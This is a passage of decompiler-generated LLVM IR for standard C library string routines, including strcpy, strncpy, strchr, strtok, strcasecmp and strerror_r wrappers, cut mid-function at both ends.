  %v3_11d88 = load i8, i8* %v2_11d88, align 1
  %v2_11d8c = icmp eq i8 %v3_11d88, 0
  br i1 %v2_11d8c, label %dec_label_pc_11dbc, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d88
  %v1_11d98 = add i32 %v0_11da037, 3
  %v2_11d98 = inttoptr i32 %v1_11d98 to i8*
  %v3_11d98 = load i8, i8* %v2_11d98, align 1
  %v2_11d9c = icmp eq i8 %v3_11d98, 0
  br i1 %v2_11d9c, label %dec_label_pc_11dbc, label %dec_label_pc_11da8

dec_label_pc_11da8:                               ; preds = %dec_label_pc_11d98, %dec_label_pc_11d50
  %v3_11dac = icmp ult i32 %v4_11d50, %v5_11dc0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11dac, label %dec_label_pc_11d50, label %dec_label_pc_11dbc

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11da8, %dec_label_pc_11d48, %dec_label_pc_11d30, %dec_label_pc_11d78, %dec_label_pc_11d88, %dec_label_pc_11d98, %bb21
  %v1_11dbc = phi i32 [ %v0_11da037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_11d48 ], [ %v1_11d78, %dec_label_pc_11d78 ], [ %v1_11d88, %dec_label_pc_11d88 ], [ %v1_11d98, %dec_label_pc_11d98 ], [ %v5_11dc0, %dec_label_pc_11da8 ], [ %v0_11d3c, %dec_label_pc_11d30 ]
  %v3_11dbc = icmp uge i32 %v5_11dc0, %v1_11dbc
  %v9_11dbc = icmp eq i32 %v5_11dc0, %v1_11dbc
  %v2_11dc0 = xor i1 %v3_11dbc, true
  %v3_11dc0 = or i1 %v9_11dbc, %v2_11dc0
  br i1 %v3_11dc0, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_11dbc
  %v6_11dc0 = sub i32 %v5_11dc0, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_11dbc, %bb22
  %v5_11dc4 = phi i32 [ %v1_11dbc, %dec_label_pc_11dbc ], [ %v6_11dc0, %bb22 ]
  %v2_11dc4 = xor i1 %v9_11dbc, true
  %v3_11dc4 = and i1 %v3_11dbc, %v2_11dc4
  br i1 %v3_11dc4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_11dc4 = sub i32 %v5_11dc4, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_11dcc = phi i32 [ 0, %bb ], [ %v5_11dc4, %bb23 ], [ %v6_11dc4, %bb24 ]
  ret i32 %v1_11dcc

; uselistorder directives
  uselistorder i1 %v3_11dbc, { 1, 0 }
  uselistorder i32 %v4_11d50, { 1, 0 }
  uselistorder i32 %v0_11da037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11d3c, { 1, 0, 2 }
  uselistorder i32 %v5_11dc0, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_11dbc, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_11d30, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11de81 = load i32, i32* @r1, align 4
  %v1_11de82 = inttoptr i32 %v0_11de81 to i8*
  %v2_11de83 = load i8, i8* %v1_11de82, align 1
  %v2_11dec5 = icmp eq i8 %v2_11de83, 0
  store i1 %v2_11dec5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11de83, i8* %arg1, align 1
  br i1 %v2_11dec5, label %dec_label_pc_11df8, label %dec_label_pc_11de0

dec_label_pc_11de0:                               ; preds = %entry, %dec_label_pc_11de0
  %v0_11de0 = load i32, i32* @r1, align 4
  %v1_11de0 = add i32 %v0_11de0, 1
  store i32 %v1_11de0, i32* @r1, align 4
  %v0_11de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11de4 = add i32 %v0_11de4, 1
  store i32 %v1_11de4, i32* %r2.global-to-local, align 4
  %v1_11de8 = inttoptr i32 %v1_11de0 to i8*
  %v2_11de8 = load i8, i8* %v1_11de8, align 1
  %v2_11dec = icmp eq i8 %v2_11de8, 0
  store i1 %v2_11dec, i1* %cpsr_z.global-to-local, align 1
  %v3_11df0 = inttoptr i32 %v1_11de4 to i8*
  store i8 %v2_11de8, i8* %v3_11df0, align 1
  %v0_11df4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11df4, label %dec_label_pc_11df8, label %dec_label_pc_11de0

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11de0, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11de0, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_11dfc = icmp eq i32 %arg2, 3
  store i1 %v7_11dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_11e00 = load i32, i32* @lr, align 4
  store i32 %v0_11e00, i32* %stack_var_-4, align 4
  %v1_11e04 = add i32 %arg1, -1
  store i32 %v1_11e04, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11e80, label %dec_label_pc_11e0c

dec_label_pc_11e0c:                               ; preds = %entry
  %v3_11e0c = udiv i32 %arg2, 4
  store i32 %v3_11e0c, i32* %lr.global-to-local, align 4
  %v0_11e10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11e5c, %dec_label_pc_11e0c
  %v2_11e18 = phi i32 [ %v6_11e50, %dec_label_pc_11e5c ], [ %v1_11e04, %dec_label_pc_11e0c ]
  %v0_11e10 = phi i32 [ %v1_11e60, %dec_label_pc_11e5c ], [ %v0_11e10.pre, %dec_label_pc_11e0c ]
  %v1_11e10 = inttoptr i32 %v0_11e10 to i8*
  %v2_11e10 = load i8, i8* %v1_11e10, align 1
  %v3_11e10 = zext i8 %v2_11e10 to i32
  store i32 %v3_11e10, i32* %r3.global-to-local, align 4
  %v2_11e14 = icmp eq i8 %v2_11e10, 0
  store i1 %v2_11e14, i1* %cpsr_z.global-to-local, align 1
  %v3_11e18 = add i32 %v2_11e18, 1
  %v4_11e18 = inttoptr i32 %v3_11e18 to i8*
  store i8 %v2_11e10, i8* %v4_11e18, align 1
  %v5_11e18 = load i32, i32* @ip, align 4
  %v6_11e18 = add i32 %v5_11e18, 1
  store i32 %v6_11e18, i32* @ip, align 4
  %v0_11e1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e1c, label %dec_label_pc_11e6c, label %dec_label_pc_11e20

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e10
  %v0_11e20 = load i32, i32* @r1, align 4
  %v1_11e20 = add i32 %v0_11e20, 1
  %v2_11e20 = inttoptr i32 %v1_11e20 to i8*
  %v3_11e20 = load i8, i8* %v2_11e20, align 1
  %v4_11e20 = zext i8 %v3_11e20 to i32
  store i32 %v4_11e20, i32* %r3.global-to-local, align 4
  %v2_11e24 = icmp eq i8 %v3_11e20, 0
  store i1 %v2_11e24, i1* %cpsr_z.global-to-local, align 1
  %v3_11e28 = add i32 %v5_11e18, 2
  %v4_11e28 = inttoptr i32 %v3_11e28 to i8*
  store i8 %v3_11e20, i8* %v4_11e28, align 1
  %v5_11e28 = load i32, i32* @ip, align 4
  %v6_11e28 = add i32 %v5_11e28, 1
  store i32 %v6_11e28, i32* @ip, align 4
  %v0_11e2c = load i32, i32* @r1, align 4
  %v1_11e2c = add i32 %v0_11e2c, 1
  store i32 %v1_11e2c, i32* %r1.global-to-local, align 4
  %v0_11e30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e30, label %dec_label_pc_11e6c, label %dec_label_pc_11e34

dec_label_pc_11e34:                               ; preds = %dec_label_pc_11e20
  %v1_11e34 = add i32 %v0_11e2c, 2
  %v2_11e34 = inttoptr i32 %v1_11e34 to i8*
  %v3_11e34 = load i8, i8* %v2_11e34, align 1
  %v4_11e34 = zext i8 %v3_11e34 to i32
  store i32 %v4_11e34, i32* %r3.global-to-local, align 4
  %v2_11e38 = icmp eq i8 %v3_11e34, 0
  store i1 %v2_11e38, i1* %cpsr_z.global-to-local, align 1
  %v3_11e3c = add i32 %v5_11e28, 2
  %v4_11e3c = inttoptr i32 %v3_11e3c to i8*
  store i8 %v3_11e34, i8* %v4_11e3c, align 1
  %v5_11e3c = load i32, i32* @ip, align 4
  %v6_11e3c = add i32 %v5_11e3c, 1
  store i32 %v6_11e3c, i32* @ip, align 4
  %v0_11e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e40 = add i32 %v0_11e40, 1
  store i32 %v1_11e40, i32* %r1.global-to-local, align 4
  %v0_11e44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e44, label %dec_label_pc_11e6c, label %dec_label_pc_11e48

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e34
  %v1_11e48 = add i32 %v0_11e40, 2
  %v2_11e48 = inttoptr i32 %v1_11e48 to i8*
  %v3_11e48 = load i8, i8* %v2_11e48, align 1
  %v4_11e48 = zext i8 %v3_11e48 to i32
  store i32 %v4_11e48, i32* %r3.global-to-local, align 4
  %v2_11e4c = icmp eq i8 %v3_11e48, 0
  store i1 %v2_11e4c, i1* %cpsr_z.global-to-local, align 1
  %v3_11e50 = add i32 %v5_11e3c, 2
  %v4_11e50 = inttoptr i32 %v3_11e50 to i8*
  store i8 %v3_11e48, i8* %v4_11e50, align 1
  %v5_11e50 = load i32, i32* @ip, align 4
  %v6_11e50 = add i32 %v5_11e50, 1
  store i32 %v6_11e50, i32* @ip, align 4
  %v0_11e54 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e54 = add i32 %v0_11e54, 1
  store i32 %v1_11e54, i32* %r1.global-to-local, align 4
  %v0_11e58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e58, label %dec_label_pc_11e6c, label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e48
  %v0_11e5c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e5c = add i32 %v0_11e5c, -1
  store i32 %v1_11e5c, i32* %lr.global-to-local, align 4
  %v7_11e5c = icmp eq i32 %v0_11e5c, 1
  store i1 %v7_11e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_11e60 = add i32 %v0_11e54, 2
  store i32 %v1_11e60, i32* @r1, align 4
  br i1 %v7_11e5c, label %dec_label_pc_11e80, label %dec_label_pc_11e10

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11e48, %dec_label_pc_11e34, %dec_label_pc_11e20, %dec_label_pc_11e10
  %v1_11e6c = phi i32 [ %v6_11e50, %dec_label_pc_11e48 ], [ %v6_11e3c, %dec_label_pc_11e34 ], [ %v6_11e28, %dec_label_pc_11e20 ], [ %v6_11e18, %dec_label_pc_11e10 ]
  %v2_11e6c1 = sub i32 %arg1, %v1_11e6c
  %v2_11e70 = add i32 %v2_11e6c1, %arg2
  %v1_11e74 = add i32 %v2_11e70, -1
  store i32 %v1_11e74, i32* %r3.global-to-local, align 4
  %v7_11e74 = icmp eq i32 %v2_11e70, 1
  store i1 %v7_11e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e74, label %dec_label_pc_11eb0, label %dec_label_pc_11ea0

dec_label_pc_11e80:                               ; preds = %dec_label_pc_11e5c, %entry
  %v2_11e907 = phi i32 [ %v1_11e04, %entry ], [ %v6_11e50, %dec_label_pc_11e5c ]
  %v1_11e80 = urem i32 %arg2, 4
  store i32 %v1_11e80, i32* %r3.global-to-local, align 4
  %v2_11e80 = icmp eq i32 %v1_11e80, 0
  store i1 %v2_11e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e80, label %dec_label_pc_11eb0, label %dec_label_pc_11e88

dec_label_pc_11e88:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_11e98.dec_label_pc_11e88_crit_edge
  %v2_11e90 = phi i32 [ %v6_11e90, %dec_label_pc_11e98.dec_label_pc_11e88_crit_edge ], [ %v2_11e907, %dec_label_pc_11e80 ]
  %v0_11e8c = phi i32 [ %v0_11e8c.pre, %dec_label_pc_11e98.dec_label_pc_11e88_crit_edge ], [ %v1_11e80, %dec_label_pc_11e80 ]
  %v0_11e88 = load i32, i32* @r1, align 4
  %v1_11e88 = inttoptr i32 %v0_11e88 to i8*
  %v2_11e88 = load i8, i8* %v1_11e88, align 1
  %v3_11e88 = zext i8 %v2_11e88 to i32
  store i32 %v3_11e88, i32* %r2.global-to-local, align 4
  %v5_11e88 = add i32 %v0_11e88, 1
  store i32 %v5_11e88, i32* @r1, align 4
  %v1_11e8c = add i32 %v0_11e8c, -1
  store i32 %v1_11e8c, i32* %r3.global-to-local, align 4
  %v7_11e8c = icmp eq i32 %v0_11e8c, 1
  store i1 %v7_11e8c, i1* %cpsr_z.global-to-local, align 1
  %v3_11e90 = add i32 %v2_11e90, 1
  %v4_11e90 = inttoptr i32 %v3_11e90 to i8*
  store i8 %v2_11e88, i8* %v4_11e90, align 1
  %v5_11e90 = load i32, i32* @ip, align 4
  %v6_11e90 = add i32 %v5_11e90, 1
  store i32 %v6_11e90, i32* @ip, align 4
  %v0_11e94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e94, label %dec_label_pc_11eb0, label %dec_label_pc_11e98

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e88
  %v0_11e98 = load i32, i32* %r2.global-to-local, align 4
  %v2_11e98 = icmp eq i32 %v0_11e98, 0
  store i1 %v2_11e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e98, label %dec_label_pc_11ea0, label %dec_label_pc_11e98.dec_label_pc_11e88_crit_edge

dec_label_pc_11e98.dec_label_pc_11e88_crit_edge:  ; preds = %dec_label_pc_11e98
  %v0_11e8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11e88

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e98, %dec_label_pc_11e6c
  %v2_11ea810 = phi i32 [ %v1_11e6c, %dec_label_pc_11e6c ], [ %v6_11e90, %dec_label_pc_11e98 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ea4

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11ea4.dec_label_pc_11ea4_crit_edge, %dec_label_pc_11ea0
  %v2_11ea8 = phi i32 [ %v6_11ea8, %dec_label_pc_11ea4.dec_label_pc_11ea4_crit_edge ], [ %v2_11ea810, %dec_label_pc_11ea0 ]
  %v0_11ea8.off0 = phi i8 [ %extract.t, %dec_label_pc_11ea4.dec_label_pc_11ea4_crit_edge ], [ 0, %dec_label_pc_11ea0 ]
  %v0_11ea4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ea4 = add i32 %v0_11ea4, -1
  store i32 %v1_11ea4, i32* %r3.global-to-local, align 4
  %v7_11ea4 = icmp eq i32 %v0_11ea4, 1
  store i1 %v7_11ea4, i1* %cpsr_z.global-to-local, align 1
  %v3_11ea8 = add i32 %v2_11ea8, 1
  %v4_11ea8 = inttoptr i32 %v3_11ea8 to i8*
  store i8 %v0_11ea8.off0, i8* %v4_11ea8, align 1
  %v5_11ea8 = load i32, i32* @ip, align 4
  %v6_11ea8 = add i32 %v5_11ea8, 1
  store i32 %v6_11ea8, i32* @ip, align 4
  %v0_11eac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11eac, label %dec_label_pc_11eb0, label %dec_label_pc_11ea4.dec_label_pc_11ea4_crit_edge

dec_label_pc_11ea4.dec_label_pc_11ea4_crit_edge:  ; preds = %dec_label_pc_11ea4
  %v0_11ea8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_11ea8.pre to i8
  br label %dec_label_pc_11ea4

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11e88, %dec_label_pc_11ea4, %dec_label_pc_11e6c, %dec_label_pc_11e80
  %v2_11eb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11eb0, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11ea8, { 1, 0 }
  uselistorder i32 %v0_11ea4, { 1, 0 }
  uselistorder i32 %v6_11e90, { 0, 2, 1 }
  uselistorder i32 %v1_11e80, { 2, 1, 0 }
  uselistorder i32 %v2_11e70, { 1, 0 }
  uselistorder i32 %v1_11e60, { 1, 0 }
  uselistorder i32 %v0_11e5c, { 1, 0 }
  uselistorder i32 %v6_11e50, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11eb0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_11e88, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11ebc = urem i32 %arg1, 256
  %v0_11edc3 = load i32, i32* @r0, align 4
  %v1_11edc4 = urem i32 %v0_11edc3, 4
  %v2_11edc5 = icmp eq i32 %v1_11edc4, 0
  br i1 %v2_11edc5, label %dec_label_pc_11ee4, label %dec_label_pc_11ec4

dec_label_pc_11ec4:                               ; preds = %entry, %dec_label_pc_11ed8
  %v0_11ed8 = phi i32 [ %v1_11ed8, %dec_label_pc_11ed8 ], [ %v0_11edc3, %entry ]
  %v1_11ec4 = inttoptr i32 %v0_11ed8 to i8*
  %v2_11ec4 = load i8, i8* %v1_11ec4, align 1
  %v3_11ec4 = zext i8 %v2_11ec4 to i32
  store i32 %v3_11ec4, i32* @r3, align 4
  %v9_11ec8 = icmp eq i32 %v3_11ec4, %v1_11ebc
  br i1 %v9_11ec8, label %dec_label_pc_11f98, label %dec_label_pc_11ed0

dec_label_pc_11ed0:                               ; preds = %dec_label_pc_11ec4
  %v2_11ed0 = icmp eq i8 %v2_11ec4, 0
  br i1 %v2_11ed0, label %dec_label_pc_11f94, label %dec_label_pc_11ed8

dec_label_pc_11ed8:                               ; preds = %dec_label_pc_11ed0
  %v1_11ed8 = add i32 %v0_11ed8, 1
  %v1_11edc = urem i32 %v1_11ed8, 4
  %v2_11edc = icmp eq i32 %v1_11edc, 0
  br i1 %v2_11edc, label %dec_label_pc_11ee4, label %dec_label_pc_11ec4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11ed8, %entry
  %v0_11ee8 = phi i32 [ %v0_11edc3, %entry ], [ %v1_11ed8, %dec_label_pc_11ed8 ]
  %v4_11ee4 = mul nuw nsw i32 %v1_11ebc, 256
  %v5_11ee4 = or i32 %v4_11ee4, %v1_11ebc
  %v4_11eec = mul i32 %v5_11ee4, 65536
  %v5_11eec = or i32 %v4_11eec, %v5_11ee4
  br label %dec_label_pc_11ef0

dec_label_pc_11ef0:                               ; preds = %dec_label_pc_11f8c, %dec_label_pc_11f2c, %dec_label_pc_11ee4
  %v0_11f54 = phi i32 [ %v0_11ee8, %dec_label_pc_11ee4 ], [ %v4_11ef0, %dec_label_pc_11f2c ], [ %v4_11ef0, %dec_label_pc_11f8c ]
  %v1_11ef0 = inttoptr i32 %v0_11f54 to i32*
  %v2_11ef0 = load i32, i32* %v1_11ef0, align 4
  %v4_11ef0 = add i32 %v0_11f54, 4
  %v2_11ef8 = xor i32 %v2_11ef0, %v5_11eec
  %v2_11efc = add i32 %v2_11ef8, 2130640639
  store i32 %v2_11efc, i32* @ip, align 4
  %v2_11f04 = add i32 %v2_11ef0, 2130640639
  %v1_11f08 = sub i32 -1, %v2_11ef0
  %v2_11f0c = xor i32 %v2_11f04, %v1_11f08
  %v2_11f18 = and i32 %v2_11f0c, -2130640640
  %v2_11f20 = icmp eq i32 %v2_11f18, 0
  br i1 %v2_11f20, label %dec_label_pc_11f2c, label %dec_label_pc_11f34

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11ef0
  %v1_11f14 = sub i32 -1, %v2_11ef8
  %v2_11f1c = xor i32 %v2_11efc, %v1_11f14
  %v2_11f24 = and i32 %v2_11f1c, -2130640640
  %v2_11f2c = icmp eq i32 %v2_11f24, 0
  br i1 %v2_11f2c, label %dec_label_pc_11ef0, label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11ef0, %dec_label_pc_11f2c
  %v2_11f34 = inttoptr i32 %v0_11f54 to i8*
  %v3_11f34 = load i8, i8* %v2_11f34, align 1
  %v4_11f34 = zext i8 %v3_11f34 to i32
  store i32 %v4_11f34, i32* @r3, align 4
  %v9_11f38 = icmp eq i32 %v4_11f34, %v1_11ebc
  br i1 %v9_11f38, label %dec_label_pc_11f98, label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11f34
  %v2_11f44 = icmp eq i8 %v3_11f34, 0
  br i1 %v2_11f44, label %dec_label_pc_11f94, label %dec_label_pc_11f4c

dec_label_pc_11f4c:                               ; preds = %dec_label_pc_11f44
  %v1_11f4c = add i32 %v0_11f54, 1
  %v2_11f4c = inttoptr i32 %v1_11f4c to i8*
  %v3_11f4c = load i8, i8* %v2_11f4c, align 1
  %v4_11f4c = zext i8 %v3_11f4c to i32
  store i32 %v4_11f4c, i32* @r3, align 4
  %v9_11f50 = icmp eq i32 %v4_11f4c, %v1_11ebc
  br i1 %v9_11f50, label %dec_label_pc_11f98, label %dec_label_pc_11f5c

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f4c
  %v2_11f5c = icmp eq i8 %v3_11f4c, 0
  br i1 %v2_11f5c, label %dec_label_pc_11f94, label %dec_label_pc_11f64

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f5c
  %v1_11f64 = add i32 %v0_11f54, 2
  %v2_11f64 = inttoptr i32 %v1_11f64 to i8*
  %v3_11f64 = load i8, i8* %v2_11f64, align 1
  %v4_11f64 = zext i8 %v3_11f64 to i32
  store i32 %v4_11f64, i32* @r3, align 4
  %v9_11f68 = icmp eq i32 %v4_11f64, %v1_11ebc
  br i1 %v9_11f68, label %dec_label_pc_11f98, label %dec_label_pc_11f74

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f64
  %v2_11f74 = icmp eq i8 %v3_11f64, 0
  br i1 %v2_11f74, label %dec_label_pc_11f94, label %dec_label_pc_11f7c

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11f74
  %v1_11f7c = add i32 %v0_11f54, 3
  %v2_11f7c = inttoptr i32 %v1_11f7c to i8*
  %v3_11f7c = load i8, i8* %v2_11f7c, align 1
  %v4_11f7c = zext i8 %v3_11f7c to i32
  store i32 %v4_11f7c, i32* @r3, align 4
  %v9_11f80 = icmp eq i32 %v4_11f7c, %v1_11ebc
  br i1 %v9_11f80, label %dec_label_pc_11f98, label %dec_label_pc_11f8c

dec_label_pc_11f8c:                               ; preds = %dec_label_pc_11f7c
  %v2_11f8c = icmp eq i8 %v3_11f7c, 0
  br i1 %v2_11f8c, label %dec_label_pc_11f94, label %dec_label_pc_11ef0

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11ed0, %dec_label_pc_11f8c, %dec_label_pc_11f74, %dec_label_pc_11f5c, %dec_label_pc_11f44
  br label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11ec4, %dec_label_pc_11f64, %dec_label_pc_11f4c, %dec_label_pc_11f34, %dec_label_pc_11f7c, %dec_label_pc_11f94
  %v1_11f9c = phi i32 [ 0, %dec_label_pc_11f94 ], [ %v1_11f64, %dec_label_pc_11f64 ], [ %v1_11f4c, %dec_label_pc_11f4c ], [ %v0_11f54, %dec_label_pc_11f34 ], [ %v1_11f7c, %dec_label_pc_11f7c ], [ %v0_11ed8, %dec_label_pc_11ec4 ]
  ret i32 %v1_11f9c

; uselistorder directives
  uselistorder i32 %v4_11ef0, { 1, 0 }
  uselistorder i32 %v2_11ef0, { 0, 2, 1 }
  uselistorder i32 %v0_11f54, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_11ee4, { 1, 0 }
  uselistorder i32 %v1_11ed8, { 1, 0, 2 }
  uselistorder i32 %v0_11edc3, { 2, 1, 0 }
  uselistorder i32 %v1_11ebc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11f98, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_11f94, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11f34, { 1, 0 }
  uselistorder label %dec_label_pc_11ec4, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11fb0 = call i32 @__xpg_strerror_r()
  %v0_11fb4 = load i32, i32* @r4, align 4
  ret i32 %v0_11fb4
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27096), i32* @r2, align 4
  %v0_11fd8 = call i32 @strtok_r()
  ret i32 %v0_11fd8
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_1200c

dec_label_pc_1200c:                               ; preds = %dec_label_pc_12038, %entry
  %v1_120508 = phi i32 [ %v1_120509, %dec_label_pc_12038 ], [ 0, %entry ]
  %v0_12040 = phi i32 [ %v1_12040, %dec_label_pc_12038 ], [ %arg2, %entry ]
  %v0_12044 = phi i32 [ %v1_12044, %dec_label_pc_12038 ], [ %tmp, %entry ]
  %v9_1200c = icmp eq i32 %v0_12044, %v0_12040
  %.pre = inttoptr i32 %v0_12044 to i8*
  br i1 %v9_1200c, label %dec_label_pc_12038, label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_1200c
  %v2_12014 = load i8, i8* %.pre, align 1
  %v3_12014 = zext i8 %v2_12014 to i32
  %v1_12018 = inttoptr i32 %v0_12040 to i8*
  %v2_12018 = load i8, i8* %v1_12018, align 1
  %v3_12018 = zext i8 %v2_12018 to i32
  %v4_1201c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 2416) to i32*), align 4
  %v2_12020 = mul nuw nsw i32 %v3_12018, 2
  %v2_12024 = mul nuw nsw i32 %v3_12014, 2
  %v2_12028 = add i32 %v4_1201c, %v2_12020
  %v3_12028 = inttoptr i32 %v2_12028 to i16*
  %v4_12028 = load i16, i16* %v3_12028, align 2
  %v6_12028 = sext i16 %v4_12028 to i32
  %v2_1202c = add i32 %v4_1201c, %v2_12024
  %v3_1202c = inttoptr i32 %v2_1202c to i16*
  %v4_1202c = load i16, i16* %v3_1202c, align 2
  %v6_1202c = sext i16 %v4_1202c to i32
  %v2_12030 = sub nsw i32 %v6_1202c, %v6_12028
  %v9_12030 = icmp eq i16 %v4_1202c, %v4_12028
  br i1 %v9_12030, label %dec_label_pc_12038, label %dec_label_pc_1204c

dec_label_pc_12038:                               ; preds = %dec_label_pc_1200c, %dec_label_pc_12014
  %v1_120509 = phi i32 [ %v2_12030, %dec_label_pc_12014 ], [ %v1_120508, %dec_label_pc_1200c ]
  %v2_12038 = load i8, i8* %.pre, align 1
  %v2_1203c = icmp eq i8 %v2_12038, 0
  %v1_12040 = add i32 %v0_12040, 1
  %v1_12044 = add i32 %v0_12044, 1
  store i32 %v1_12044, i32* @ip, align 4
  br i1 %v2_1203c, label %dec_label_pc_1204c, label %dec_label_pc_1200c

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12038, %dec_label_pc_12014
  %v1_12050 = phi i32 [ %v1_120509, %dec_label_pc_12038 ], [ %v2_12030, %dec_label_pc_12014 ]
  ret i32 %v1_12050

; uselistorder directives
  uselistorder i32 %v1_12044, { 1, 0 }
  uselistorder i32 %v2_12030, { 1, 0 }
  uselistorder i32 %v0_12044, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12038, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_1205c = load i32, i32* @r4, align 4
  %v9_1205c = load i32, i32* @r6, align 4
  %v0_12064 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  store i32 %v0_12064, i32* @ip, align 4
  %v0_12074 = load i32, i32* @r1, align 4
  store i32 %v0_12074, i32* @r7, align 4
  %v0_12078 = load i32, i32* @r2, align 4
